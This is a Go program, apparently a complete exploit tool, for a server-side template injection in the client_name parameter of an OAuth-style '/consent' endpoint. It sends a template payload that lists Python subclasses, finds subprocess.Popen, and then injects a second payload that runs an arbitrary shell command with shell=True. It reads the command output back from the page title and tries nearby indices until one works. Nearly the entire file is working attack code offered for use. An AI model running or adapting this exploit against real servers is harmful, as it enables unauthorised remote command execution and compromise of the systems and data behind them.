package main

import (
    "flag"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "regexp"
    "strings"
    "time"
    "log"
)

// Config holds command-line arguments
type Config struct {
    IP        string
    Port      int
    ClientID  string
    Scope     string
    Command   string
    Buffer    int
    Delay     float64
    Output    string
}

// ParseFlags parses command-line flags into a Config struct
func ParseFlags() *Config {
    cfg := &Config{}
    flag.StringVar(&cfg.IP, "ip", "localhost", "Target IP address (default: localhost)")
    flag.IntVar(&cfg.Port, "port", 666, "Target port (default: 666)")
    flag.StringVar(&cfg.ClientID, "client_id", "", "Client ID registered via /register endpoint (required)")
    flag.StringVar(&cfg.Scope, "scope", "read,write", "Scopes to request (default: read,write)")
    flag.StringVar(&cfg.Command, "command", "uname -a", `Command to execute (default: "uname -a")`)
    flag.IntVar(&cfg.Buffer, "buffer", 5, "Buffer range around detected Popen index (default: 5)")
    flag.Float64Var(&cfg.Delay, "delay", 0.1, "Delay (in seconds) between requests (default: 0.1)")
    flag.StringVar(&cfg.Output, "output", "subclasses_full.txt", "Output file to save subclasses list (default: subclasses_full.txt)")
    flag.Parse()

    if cfg.ClientID == "" {
        fmt.Println("Error: --client_id is required.")
        flag.Usage()
        os.Exit(1)
    }
    return cfg
}

// EnumerateSubclasses sends a payload to enumerate all Python subclasses via the SSTI vulnerability
func EnumerateSubclasses(baseURL, clientID, scope string) ([]string, error) {
    payload := "{{ ''.__class__.__mro__[1].__subclasses__() }}"

    // Build the URL
    u, err := url.Parse(baseURL)
    if err != nil {
        return nil, fmt.Errorf("failed to parse baseURL: %w", err)
    }

    // Set query parameters properly (URL-encoded)
    q := u.Query()
    q.Set("client_id", clientID)
    q.Set("client_name", payload)
    q.Set("scope", scope)
    u.RawQuery = q.Encode()

    log.Printf("[INFO] Sending enumeration payload to %s", u.String())

    client := &http.Client{ Timeout: 10 * time.Second }
    resp, err := client.Get(u.String())
    if err != nil {
        return nil, fmt.Errorf("request failed during enumeration: %w", err)
    }
    defer resp.Body.Close()

    bodyBytes, _ := io.ReadAll(resp.Body)
    bodyString := string(bodyBytes)

    if resp.StatusCode != http.StatusOK {
        // Log full body if not 200
        return nil, fmt.Errorf("unexpected HTTP status code %d.\nResponse Body:\n%s",
            resp.StatusCode, bodyString)
    }

    // Extract from <title>Consent for ( ... )</title>
    reTitle := regexp.MustCompile(`<title>Consent for (.*?)</title>`)
    match := reTitle.FindStringSubmatch(bodyString)
    if len(match) < 2 {
        // Log the entire response for debugging
        return nil, fmt.Errorf("no <title> tag found or could not extract content.\nFull Response:\n%s",
            bodyString)
    }

    classListStr := match[1]

    // Extract all class names from <class '...'>
    reClass := regexp.MustCompile(`<class '([^']+)'>`)
    subclassesMatches := reClass.FindAllStringSubmatch(classListStr, -1)

    var subclasses []string
    for _, sm := range subclassesMatches {
        if len(sm) == 2 {
            subclasses = append(subclasses, sm[1])
        }
    }
    if len(subclasses) == 0 {
        return nil, fmt.Errorf("failed to extract subclasses; payload may not be executing.\nFull Response:\n%s",
            bodyString)
    }

    log.Printf("[INFO] Found %d subclasses.", len(subclasses))
    return subclasses, nil
}

// SaveSubclasses writes the list of subclasses to a file
func SaveSubclasses(subclasses []string, outputFile string) error {
    f, err := os.Create(outputFile)
    if err != nil {
        return fmt.Errorf("failed to write to file %s: %w", outputFile, err)
    }
    defer f.Close()

    for i, cls := range subclasses {
        line := fmt.Sprintf("%d: %s\n", i, cls)
        _, err := f.WriteString(line)
        if err != nil {
            return fmt.Errorf("error writing to file: %w", err)
        }
    }
    log.Printf("[INFO] Subclasses list saved to %s", outputFile)
    return nil
}

// FindPopenIndex searches for 'subprocess.Popen' in the subclasses list
func FindPopenIndex(subclasses []string) (int, error) {
    for i, cls := range subclasses {
        if cls == "subprocess.Popen" {
            log.Printf("[INFO] 'subprocess.Popen' found at index %d", i)
            return i, nil
        }
    }
    return -1, fmt.Errorf("'subprocess.Popen' not found in subclasses list")
}

// ExecuteCommand executes a command via the SSTI vulnerability at a specific subclass index
func ExecuteCommand(baseURL, clientID, scope string, index int, command string) (string, error) {
    payload := fmt.Sprintf(
        "{{ ''.__class__.__mro__[1].__subclasses__()[%d]('%s', shell=True, stdout=-1).communicate()[0].decode() }}",
        index, command,
    )

    // Build the URL
    u, err := url.Parse(baseURL)
    if err != nil {
        return "", fmt.Errorf("failed to parse baseURL: %w", err)
    }

    // Set query parameters properly (URL-encoded)
    q := u.Query()
    q.Set("client_id", clientID)
    q.Set("client_name", payload)
    q.Set("scope", scope)
    u.RawQuery = q.Encode()

    log.Printf("[INFO] Executing command at index %d: %s", index, command)

    client := &http.Client{ Timeout: 10 * time.Second }
    resp, err := client.Get(u.String())
    if err != nil {
        return "", fmt.Errorf("request failed during command execution: %w", err)
    }
    defer resp.Body.Close()

    bodyBytes, _ := io.ReadAll(resp.Body)
    bodyString := string(bodyBytes)

    switch resp.StatusCode {
    case http.StatusOK:
        // Attempt to parse the <title> tag
        reTitle := regexp.MustCompile(`<title>Consent for (.*?)</title>`)
        match := reTitle.FindStringSubmatch(bodyString)
        if len(match) < 2 {
            // We got a 200, but can't parse the <title> => log raw content
            return "", fmt.Errorf("command output not found in <title>.\nFull Response:\n%s", bodyString)
        }
        commandOutput := strings.TrimSpace(match[1])
        log.Printf("[INFO] Command Output: %s", commandOutput)
        return commandOutput, nil

    case http.StatusInternalServerError:
        log.Printf("[WARN] Internal Server Error at index %d\nFull Body:\n%s", index, bodyString)
        return "", nil

    default:
        // Log anything else (3xx, 4xx, etc.)
        return "", fmt.Errorf("unexpected HTTP status code %d.\nResponse Body:\n%s",
            resp.StatusCode, bodyString)
    }
}

func main() {
    cfg := ParseFlags()
    baseURL := fmt.Sprintf("http://%s:%d/consent", cfg.IP, cfg.Port)

    // 1. Enumerate subclasses
    subclasses, err := EnumerateSubclasses(baseURL, cfg.ClientID, cfg.Scope)
    if err != nil {
        log.Fatalf("[ERROR] %v", err)
    }

    // Print all subclasses
    log.Printf("[INFO] List of subclasses:")
    for i, cls := range subclasses {
        fmt.Printf("%d: %s\n", i, cls)
    }

    // 2. Save subclasses to file
    if err := SaveSubclasses(subclasses, cfg.Output); err != nil {
        log.Fatalf("[ERROR] %v", err)
    }

    // 3. Find 'subprocess.Popen' index
    popenIndex, err := FindPopenIndex(subclasses)
    if err != nil {
        log.Fatalf("[ERROR] %v", err)
    }

    // 4. Define buffer range
    startIndex := popenIndex - cfg.Buffer
    if startIndex < 0 {
        startIndex = 0
    }
    endIndex := popenIndex + cfg.Buffer
    if endIndex >= len(subclasses) {
        endIndex = len(subclasses) - 1
    }

    log.Printf("[INFO] Attempting to exploit within buffer range: %d to %d", startIndex, endIndex)

    // Try indices in the buffer range (excluding popenIndex, which we’ll test after)
    for idx := startIndex; idx <= endIndex; idx++ {
        if idx == popenIndex {
            continue
        }
        output, err := ExecuteCommand(baseURL, cfg.ClientID, cfg.Scope, idx, cfg.Command)
        time.Sleep(time.Duration(cfg.Delay * float64(time.Second)))

        if err == nil && output != "" {
            fmt.Printf("\n[SUCCESS] Command '%s' executed at index %d:\n%s\n", cfg.Command, idx, output)
            os.Exit(0)
        } else if err != nil {
            log.Printf("[DEBUG] Attempt at index %d returned error: %v", idx, err)
        }
    }

    // Finally, try the actual popenIndex
    log.Printf("[INFO] Attempting to exploit at the detected 'subprocess.Popen' index: %d", popenIndex)
    output, err := ExecuteCommand(baseURL, cfg.ClientID, cfg.Scope, popenIndex, cfg.Command)
    if err == nil && output != "" {
        fmt.Printf("\n[SUCCESS] Command '%s' executed at index %d:\n%s\n", cfg.Command, popenIndex, output)
    } else {
        if err != nil {
            log.Printf("[DEBUG] Attempt at popenIndex %d returned error: %v", popenIndex, err)
        }
        fmt.Printf("\n[FAIL] Could not execute the command in the scanned range.\n")
    }
}

//
//
